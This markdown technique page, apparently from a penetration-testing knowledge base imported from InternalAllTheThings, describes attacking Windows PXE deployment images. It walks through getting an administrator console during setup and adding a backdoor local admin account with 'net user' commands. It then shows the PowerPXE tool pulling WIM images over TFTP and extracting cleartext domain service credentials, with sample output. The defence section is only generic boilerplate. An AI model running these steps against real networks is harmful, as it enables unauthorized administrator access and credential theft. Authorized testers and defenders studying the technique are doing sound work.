---
title: Internal - PXE Boot Image
type: technique
tags: [active-directory, credentials, network, pxe, reference-import, windows]
phase: recon
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Internal - PXE Boot Image

## What it is

PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.

## How it works

PXE boot retrieves a WIM or other OS image over TFTP from a deployment server (MDT/SCCM/WDS) without authentication, allowing any machine on the network segment to download the image. An attacker downloads the PXE boot image using `tftp` or PowerPXE, then mounts it offline to extract `Bootstrap.ini` and `CustomSettings.ini` files containing domain join credentials, network access account credentials, and local administrator passwords in cleartext. These credentials are usable for immediate domain authentication and are often the same credentials stored in the SCCM or MDT deployment share.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.

- Press **[F8]** during the PXE boot to spawn an administrator console on the deployed machine.
- Press **[SHIFT+F10]** during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.

```powershell
net user hacker Password123! /add
net localgroup administrators /add hacker
```

- Extract the pre-boot image (wim files) using [PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.

```powershell
# Import the module
PS > Import-Module .\PowerPXE.ps1

# Start the exploit on the Ethernet interface
PS > Get-PXEcreds -InterfaceAlias Ethernet
PS > Get-PXECreds -InterfaceAlias « lab 0 » 

# Wait for the DHCP to get an address
>> Get a valid IP address
>>> >>> DHCP proposal IP address: 192.168.22.101
>>> >>> DHCP Validation: DHCPACK
>>> >>> IP address configured: 192.168.22.101

# Extract BCD path from the DHCP response
>> Request BCD File path
>>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
>>> >>> TFTP IP Address:  192.168.22.3

# Download the BCD file and extract wim files
>> Launch TFTP download
>>>> Transfer succeeded.
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
>> Launch TFTP download
>>>> Transfer succeeded.

# Parse wim files to find interesting data
>> Open LiteTouchPE_x86.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
>>>> >>>> UserID = MdtService
>>>> >>>> UserPassword = Somepass1
```

## References

- [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
- [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
